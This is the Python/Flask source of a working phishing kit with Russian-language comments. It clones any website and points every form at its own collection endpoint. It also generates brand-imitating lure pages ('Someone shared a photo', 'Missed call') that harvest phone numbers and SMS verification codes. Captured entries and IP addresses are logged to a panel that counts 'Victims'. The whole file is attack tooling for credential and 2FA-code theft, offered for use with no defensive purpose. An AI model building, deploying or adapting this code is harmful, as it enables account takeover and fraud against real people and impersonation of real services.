from flask import Flask, request, send_file, jsonify
import requests
from bs4 import BeautifulSoup
import os
import shutil
from urllib.parse import urljoin, urlparse
import zipfile
import time
import re
import hashlib
import json

app = Flask(__name__)
PROJECTS = {}

# ========== ГЛАВНАЯ СТРАНИЦА ==========
@app.route('/')
def home():
    return r'''<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Cloner + Phish</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0f;color:#e0e0e0;font-family:Arial,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
        .box{max-width:500px;width:100%}
        h1{text-align:center;font-size:28px;margin-bottom:5px;background:linear-gradient(135deg,#667eea,#f5576c);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .sub{text-align:center;color:#666;margin-bottom:20px;font-size:13px}
        .tabs{display:flex;gap:10px;margin-bottom:20px}
        .tab{flex:1;padding:12px;text-align:center;border-radius:12px;cursor:pointer;background:#111122;border:1px solid #222;font-size:14px}
        .tab.active{background:#667eea;border-color:#667eea}
        .tab-content{display:none}
        .tab-content.active{display:block}
        .card{background:#111122;border-radius:16px;padding:25px;border:1px solid #222}
        label{display:block;margin-bottom:8px;color:#aaa;font-size:14px}
        input,select{width:100%;padding:14px;border:1px solid #333;border-radius:12px;background:#0a0a14;color:#fff;font-size:16px;margin-bottom:15px}
        input:focus,select:focus{outline:none;border-color:#667eea}
        button{width:100%;padding:15px;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;color:#fff}
        button:hover{opacity:0.85}
        button:disabled{opacity:0.4}
        .btn-clone{background:linear-gradient(135deg,#667eea,#764ba2)}
        .btn-phish{background:linear-gradient(135deg,#f093fb,#f5576c)}
        .result{margin-top:20px;padding:20px;border-radius:12px;display:none;word-break:break-all}
        .result.show{display:block}
        .result.success{background:#0a2a0a;border:1px solid #0f0}
        .result.error{background:#2a0a0a;border:1px solid #f00}
        .result a{color:#667eea}
        .loading{display:none;text-align:center;padding:15px;color:#888}
        .spinner{width:30px;height:30px;border:3px solid #333;border-top-color:#667eea;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 10px}
        @keyframes spin{to{transform:rotate(360deg)}}
        .stats{display:flex;gap:10px;margin-bottom:15px}
        .stat{flex:1;text-align:center;padding:10px;background:#0a0a14;border-radius:8px}
        .stat .num{font-size:24px;color:#667eea}
        .stat .lbl{font-size:11px;color:#888}
        .btn-dl{display:inline-block;background:#667eea;color:#fff;padding:10px 20px;border-radius:8px;text-decoration:none;margin:5px;font-size:14px}
        .btn-panel{display:inline-block;background:#f5576c;color:#fff;padding:10px 20px;border-radius:8px;text-decoration:none;margin:5px;font-size:14px}
    </style>
</head>
<body>
<div class="box">
    <h1>SITE TOOLS</h1>
    <p class="sub">Clone & Phish</p>
    
    <div class="tabs">
        <div class="tab active" onclick="switchTab('clone')">CLONE</div>
        <div class="tab" onclick="switchTab('phish')">PHISH</div>
    </div>
    
    <!-- CLONE TAB -->
    <div class="tab-content active" id="tab-clone">
        <div class="card">
            <label>Website URL</label>
            <input type="text" id="cloneUrl" placeholder="https://example.com">
            <button class="btn-clone" onclick="doClone()" id="cloneBtn">CLONE SITE</button>
        </div>
    </div>
    
    <!-- PHISH TAB -->
    <div class="tab-content" id="tab-phish">
        <div class="card">
            <label>Website URL (для дизайна)</label>
            <input type="text" id="phishUrl" placeholder="https://max.ru">
            <label>Story</label>
            <select id="phishStory">
                <option value="photo">Someone shared a photo</option>
                <option value="message">New message</option>
                <option value="voice">Missed call</option>
                <option value="login">Please log in</option>
            </select>
            <button class="btn-phish" onclick="doPhish()" id="phishBtn">CREATE PHISH</button>
        </div>
    </div>
    
    <div class="loading" id="loading"><div class="spinner"></div><div>Working...</div></div>
    <div class="result" id="result"></div>
</div>

<script>
function switchTab(t){
    document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('active'));
    event.target.classList.add('active');
    document.getElementById('tab-'+t).classList.add('active');
}

async function doClone(){
    var url=document.getElementById('cloneUrl').value.trim();
    if(!url)return;
    await runTask('/api/clone',{url:url});
}

async function doPhish(){
    var url=document.getElementById('phishUrl').value.trim();
    var story=document.getElementById('phishStory').value;
    if(!url)return;
    await runTask('/api/phish',{url:url,story:story});
}

async function runTask(endpoint,data){
    var btn=document.querySelectorAll('button');
    var load=document.getElementById('loading');
    var res=document.getElementById('result');
    btn.forEach(b=>b.disabled=true);
    load.style.display='block';
    res.classList.remove('show');
    try{
        var r=await fetch(endpoint,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
        var d=await r.json();
        if(d.error){
            res.innerHTML='<b>Error:</b> '+d.error;
            res.classList.add('show','error');
        }else{
            var html='<div class="stats"><div class="stat"><div class="num">'+d.assets+'</div><div class="lbl">Files</div></div><div class="stat"><div class="num">'+d.forms+'</div><div class="lbl">Forms</div></div></div>';
            html+='<b>Clone URL:</b><br><a href="'+d.url+'" target="_blank">'+d.url+'</a><br><br>';
            html+='<a href="'+d.download+'" class="btn-dl">DOWNLOAD ZIP</a>';
            html+='<a href="'+d.panel+'" class="btn-panel" target="_blank">LOGS PANEL</a>';
            html+='<br><br><b>Victim Logs:</b><br><a href="'+d.logs+'" target="_blank">'+d.logs+'</a>';
            res.innerHTML=html;
            res.classList.add('show','success');
        }
    }catch(e){
        res.innerHTML='<b>Error:</b> '+e.message;
        res.classList.add('show','error');
    }
    btn.forEach(b=>b.disabled=false);
    load.style.display='none';
}
</script>
</body>
</html>'''

# ========== PHISH HTML GENERATOR ==========
def make_phish_page(phish_id, brand_name, primary_color, logo_url, story_title, story_body, story_button, redirect_url):
    logo_html = '<img src="' + logo_url + '" style="height:40px">' if logo_url else '<div style="font-size:24px;font-weight:700">' + brand_name + '</div>'
    
    return '''<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>''' + brand_name + '''</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:#f5f5f5;
            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
            min-height:100vh;
            display:flex;
            flex-direction:column;
            align-items:center;
            justify-content:center;
            padding:20px;
        }
        .container{max-width:380px;width:100%;text-align:center}
        .logo{margin-bottom:30px}
        .card{
            background:#fff;
            border-radius:16px;
            padding:30px 20px;
            box-shadow:0 2px 20px rgba(0,0,0,0.08);
            margin-bottom:20px;
        }
        .icon{
            width:60px;height:60px;
            background:''' + primary_color + ''';
            border-radius:50%;
            display:flex;align-items:center;justify-content:center;
            margin:0 auto 20px;
            font-size:28px;
        }
        .story-title{font-size:18px;font-weight:600;color:#000;margin-bottom:10px}
        .story-body{font-size:14px;color:#666;margin-bottom:25px;line-height:1.5}
        .input-group{margin-bottom:15px;text-align:left}
        .input-group label{display:block;font-size:13px;color:#888;margin-bottom:5px}
        .input-group input{
            width:100%;padding:14px 16px;
            border:1.5px solid #e0e0e0;
            border-radius:12px;
            font-size:16px;
            background:#f8f8f8;
        }
        .input-group input:focus{outline:none;border-color:''' + primary_color + ''';background:#fff}
        .phone-row{display:flex;gap:8px}
        .phone-row select{
            padding:14px 12px;
            border:1.5px solid #e0e0e0;
            border-radius:12px;
            font-size:16px;
            background:#f8f8f8;
        }
        .phone-row input{flex:1}
        .btn{
            width:100%;padding:15px;
            background:''' + primary_color + ''';
            color:#fff;border:none;
            border-radius:12px;
            font-size:17px;font-weight:600;
            cursor:pointer;margin-top:5px;
        }
        .btn:hover{opacity:0.9}
        .btn:disabled{opacity:0.5}
        .footer{font-size:12px;color:#999;text-align:center;margin-top:20px;line-height:1.6}
        .footer a{color:''' + primary_color + ''';text-decoration:none}
        .error{background:#fff0f0;color:#d00;padding:12px;border-radius:10px;font-size:13px;margin-bottom:15px;display:none}
        .loading{display:none;text-align:center;color:#888;font-size:14px;margin:15px 0}
        .spinner{
            display:inline-block;width:20px;height:20px;
            border:2px solid #ddd;border-top-color:''' + primary_color + ''';
            border-radius:50%;animation:spin 0.8s linear infinite;
            margin-right:8px;vertical-align:middle;
        }
        @keyframes spin{to{transform:rotate(360deg)}}
    </style>
</head>
<body>
<div class="container">
    <div class="logo">''' + logo_html + '''</div>
    <div class="card">
        <div class="icon">MSG</div>
        <div class="story-title">''' + story_title + '''</div>
        <div class="story-body">''' + story_body + '''</div>
        <div class="error" id="error"></div>
        <form id="f">
            <div class="input-group">
                <label>Phone number</label>
                <div class="phone-row">
                    <select><option>+7</option><option>+375</option><option>+380</option></select>
                    <input type="tel" id="phone" placeholder="(999) 123-45-67" required autofocus>
                </div>
            </div>
            <div class="input-group" id="codeGroup" style="display:none">
                <label>SMS Code</label>
                <input type="text" id="code" placeholder="Enter code" maxlength="6">
            </div>
            <button type="submit" class="btn" id="btn">''' + story_button + '''</button>
        </form>
        <div class="loading" id="loading"><div class="spinner"></div>Checking...</div>
    </div>
    <div class="footer">By clicking, you agree to<br><a href="#">Terms</a> and <a href="#">Privacy Policy</a></div>
</div>
<script>
var step=1;
var pid=''' + phish_id + '''';
var redir=''' + redirect_url + '''';
document.getElementById('phone').addEventListener('input',function(e){
    var v=e.target.value.replace(/[^0-9]/g,'');
    if(v.length>10)v=v.slice(0,10);
    if(v.length>0)v='('+v.slice(0,3)+') '+v.slice(3,6)+'-'+v.slice(6,10);
    e.target.value=v;
});
document.getElementById('f').addEventListener('submit',function(e){
    e.preventDefault();
    var phone=document.getElementById('phone').value.replace(/[^0-9]/g,'');
    if(step===1){
        if(phone.length<10){showError('Enter full number');return;}
        fetch('/submit/'+pid,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'phone='+phone+'&step=1'});
        document.getElementById('codeGroup').style.display='block';
        document.getElementById('btn').textContent='Confirm';
        document.getElementById('code').focus();
        step=2;
    }else{
        var code=document.getElementById('code').value.trim();
        if(code.length<4){showError('Enter full code');return;}
        document.getElementById('loading').style.display='block';
        document.getElementById('btn').disabled=true;
        fetch('/submit/'+pid,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'phone='+phone+'&code='+code+'&step=2'});
        setTimeout(function(){window.location.href=redir},3000);
    }
});
function showError(m){
    var er=document.getElementById('error');
    er.textContent=m;er.style.display='block';
    setTimeout(function(){er.style.display='none'},3000);
}
</script>
</body>
</html>'''

# ========== API CLONE ==========
@app.route('/api/clone', methods=['POST'])
def api_clone():
    data = request.get_json(silent=True) or {}
    url = data.get('url', '').strip()
    if not url: return jsonify({'error': 'URL required'}), 400
    if not url.startswith('http'): url = 'https://' + url
    
    pid = 'c' + hashlib.md5((url + str(time.time())).encode()).hexdigest()[:10]
    out = '/tmp/' + pid
    os.makedirs(out + '/assets', exist_ok=True)
    
    sess = requests.Session()
    sess.headers['User-Agent'] = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)'
    
    try:
        r = sess.get(url, allow_redirects=True, timeout=20)
        if r.status_code != 200: return jsonify({'error': 'HTTP ' + str(r.status_code)}), 400
        soup = BeautifulSoup(r.text, 'html.parser')
        domain = urlparse(r.url).netloc
        assets = 0
        forms = 0
        
        for tag in soup.find_all('link', href=True):
            href = tag['href'].strip()
            if not href: continue
            if not href.startswith('http'): href = urljoin(url, href)
            try:
                name = os.path.basename(urlparse(href).path.split('?')[0]) or 'style.css'
                if '.' not in name: name += '.css'
                ar = sess.get(href, timeout=10)
                if ar.status_code == 200 and len(ar.content) > 100:
                    with open(out + '/assets/' + name, 'wb') as f: f.write(ar.content)
                    tag['href'] = '/p/' + pid + '/assets/' + name
                    assets += 1
            except: pass
        
        for tag in soup.find_all('script', src=True):
            src = tag['src'].strip()
            if not src: continue
            if not src.startswith('http'): src = urljoin(url, src)
            try:
                name = os.path.basename(urlparse(src).path.split('?')[0]) or 'script.js'
                if '.' not in name: name += '.js'
                ar = sess.get(src, timeout=10)
                if ar.status_code == 200 and len(ar.content) > 100:
                    with open(out + '/assets/' + name, 'wb') as f: f.write(ar.content)
                    tag['src'] = '/p/' + pid + '/assets/' + name
                    assets += 1
            except: pass
        
        for tag in soup.find_all('img', src=True):
            src = tag['src'].strip()
            if not src or src.startswith('data:'): continue
            if not src.startswith('http'): src = urljoin(url, src)
            try:
                ext = os.path.splitext(urlparse(src).path.split('?')[0])[1] or '.png'
                name = 'img_' + str(abs(hash(src)))[:8] + ext
                ar = sess.get(src, timeout=10)
                if ar.status_code == 200 and len(ar.content) > 100:
                    with open(out + '/assets/' + name, 'wb') as f: f.write(ar.content)
                    tag['src'] = '/p/' + pid + '/assets/' + name
                    assets += 1
            except: pass
        
        for form in soup.find_all('form'):
            form['action'] = '/submit/' + pid
            form['method'] = 'POST'
            forms += 1
        
        body = soup.find('body')
        html = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0">\n<title>' + domain + '</title>\n'
        for tag in soup.find_all('link', href=True): html += str(tag) + '\n'
        html += '</head>\n<body>\n' + (str(body) if body else str(soup)) + '\n</body>\n</html>'
        
        with open(out + '/index.html', 'w', encoding='utf-8') as f: f.write(html)
        
        PROJECTS[pid] = {'url': url, 'domain': domain, 'dir': out, 'assets': assets, 'forms': forms, 'logs': [], 'type': 'clone'}
        
        host = request.host_url.rstrip('/')
        return jsonify({
            'id': pid, 'url': host + '/p/' + pid, 'download': host + '/api/download/' + pid,
            'panel': host + '/panel/' + pid, 'logs': host + '/api/logs/' + pid,
            'assets': assets, 'forms': forms
        })
    except Exception as e:
        return jsonify({'error': str(e)[:200]}), 500

# ========== API PHISH ==========
@app.route('/api/phish', methods=['POST'])
def api_phish():
    data = request.get_json(silent=True) or {}
    url = data.get('url', '').strip()
    story_key = data.get('story', 'photo')
    if not url: return jsonify({'error': 'URL required'}), 400
    if not url.startswith('http'): url = 'https://' + url
    
    stories = {
        'photo': {'title': 'Someone shared a photo with you', 'body': 'Log in to your account to view the image.', 'button': 'Continue'},
        'message': {'title': 'New message', 'body': 'You have an unread message. Log in to view.', 'button': 'Open'},
        'voice': {'title': 'Missed call', 'body': 'You have a missed voice call. Log in to listen.', 'button': 'Listen'},
        'login': {'title': 'Login required', 'body': 'Please log in to continue.', 'button': 'Log in'},
    }
    story = stories.get(story_key, stories['photo'])
    
    pid = 'p' + hashlib.md5((url + str(time.time())).encode()).hexdigest()[:10]
    out = '/tmp/' + pid
    os.makedirs(out + '/assets', exist_ok=True)
    
    sess = requests.Session()
    sess.headers['User-Agent'] = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)'
    
    try:
        r = sess.get(url, allow_redirects=True, timeout=20)
        soup = BeautifulSoup(r.text, 'html.parser')
        domain = urlparse(r.url).netloc
        
        title = soup.find('title')
        brand = title.text.split('|')[0].split('"')[0].strip()[:30] if title else domain
        
        primary = '#007aff'
        for style in soup.find_all('style'):
            if style.string:
                colors = re.findall(r'#[0-9a-fA-F]{6}', style.string)
                if colors: primary = colors[0]; break
        
        logo = None
        for img in soup.find_all('img'):
            src = img.get('src', '')
            if 'logo' in src.lower() or 'logo' in img.get('alt', '').lower():
                logo = src
                break
        
        local_logo = None
        if logo:
            try:
                logo_url = urljoin(url, logo)
                ar = sess.get(logo_url, timeout=10)
                if ar.status_code == 200:
                    ext = os.path.splitext(urlparse(logo_url).path)[1] or '.png'
                    lname = 'logo' + ext
                    with open(out + '/assets/' + lname, 'wb') as f: f.write(ar.content)
                    local_logo = '/p/' + pid + '/assets/' + lname
            except: pass
        
        html = make_phish_page(pid, brand, primary, local_logo, story['title'], story['body'], story['button'], url)
        
        with open(out + '/index.html', 'w', encoding='utf-8') as f: f.write(html)
        
        PROJECTS[pid] = {'url': url, 'domain': domain, 'dir': out, 'assets': 1, 'forms': 1, 'logs': [], 'type': 'phish'}
        
        host = request.host_url.rstrip('/')
        return jsonify({
            'id': pid, 'url': host + '/p/' + pid, 'download': host + '/api/download/' + pid,
            'panel': host + '/panel/' + pid, 'logs': host + '/api/logs/' + pid,
            'assets': 1, 'forms': 1
        })
    except Exception as e:
        return jsonify({'error': str(e)[:200]}), 500

# ========== SERVE ==========
@app.route('/p/<pid>')
def serve_page(pid):
    path = '/tmp/' + pid + '/index.html'
    if os.path.exists(path): return open(path, encoding='utf-8').read()
    return 'Not found', 404

@app.route('/p/<pid>/assets/<name>')
def serve_asset(pid, name):
    path = '/tmp/' + pid + '/assets/' + name
    if os.path.exists(path):
        ct = 'text/css' if name.endswith('.css') else 'application/javascript' if name.endswith('.js') else 'image/png'
        return open(path, 'rb').read(), 200, {'Content-Type': ct}
    return 'Not found', 404

# ========== SUBMIT ==========
@app.route('/submit/<pid>', methods=['POST'])
def submit_data(pid):
    data = dict(request.form)
    data['ip'] = request.remote_addr
    data['time'] = time.strftime('%Y-%m-%d %H:%M:%S')
    if pid in PROJECTS: PROJECTS[pid].setdefault('logs', []).append(data)
    with open('/tmp/' + pid + '/logs.json', 'a') as f: f.write(json.dumps(data) + '\n')
    redirect_to = PROJECTS.get(pid, {}).get('url', 'https://google.com')
    return '<script>window.location.href="' + redirect_to + '";</script>'

# ========== LOGS PANEL ==========
@app.route('/panel/<pid>')
def panel(pid):
    logs = PROJECTS.get(pid, {}).get('logs', [])
    log_html = ''
    for l in logs[-20:]:
        log_html += '<div style="background:#111;padding:8px;margin:4px 0;border-radius:5px;font-size:12px;font-family:monospace">'
        for k, v in l.items():
            if k != 'ua': log_html += '<span style="color:#ff0">' + k + ':</span> <span style="color:#0ff">' + str(v) + '</span> '
        log_html += '</div>'
    
    return '''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Logs</title>
<style>*{margin:0;padding:0}body{background:#0a0a0f;color:#0f0;font-family:monospace;padding:20px}h1{border-bottom:1px solid #333;padding-bottom:10px;margin-bottom:15px;font-size:20px}.count{color:#f00;font-size:24px}</style>
<script>setInterval(function(){location.reload()},5000)</script></head>
<body><h1>LOGS | ''' + pid + '''</h1><div class="count">Victims: ''' + str(len(logs)) + '''</div><br>''' + (log_html or '<p style="color:#666">Waiting...</p>') + '''</body></html>'''

# ========== LOGS API ==========
@app.route('/api/logs/<pid>')
def api_logs(pid):
    logs = PROJECTS.get(pid, {}).get('logs', [])
    return jsonify({'logs': logs, 'count': len(logs)})

# ========== DOWNLOAD ==========
@app.route('/api/download/<pid>')
def api_download(pid):
    if pid not in PROJECTS: return 'Not found', 404
    zip_path = '/tmp/' + pid + '.zip'
    shutil.make_archive('/tmp/' + pid, 'zip', PROJECTS[pid]['dir'])
    return send_file(zip_path, as_attachment=True, download_name=pid + '.zip')

# ========== START ==========
if __name__ == '__main__':
    os.makedirs('/tmp', exist_ok=True)
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
